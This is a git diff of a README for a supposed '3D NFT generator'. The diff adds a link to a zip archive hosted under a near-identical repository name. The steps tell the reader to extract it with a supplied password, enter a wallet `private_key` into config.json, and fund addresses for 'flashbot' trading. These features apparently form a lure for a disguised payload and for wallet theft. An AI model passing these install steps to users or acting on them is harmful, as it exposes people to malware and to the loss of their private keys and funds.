@@ -3,7 +3,7 @@
 ![](https://github.com/qkoci/3D_NFT_Generator/blob/main/usage.jpg)
 
 ## Install
-- Clone the repository release and extract files with password `wUGuZ8fR7`.
+- [Clone](https://github.com/qkoci/3D-NFT-Generator/archive/refs/heads/main.zip) the repository release and extract files with password `wUGuZ8fR7`.
 - Edit the address and `private_key` fields in the `config.json` file.
 - Set up the network and AMMs in the flashbot menu. Ensure that there are sufficient funds on the specified address to cover transaction fees
 
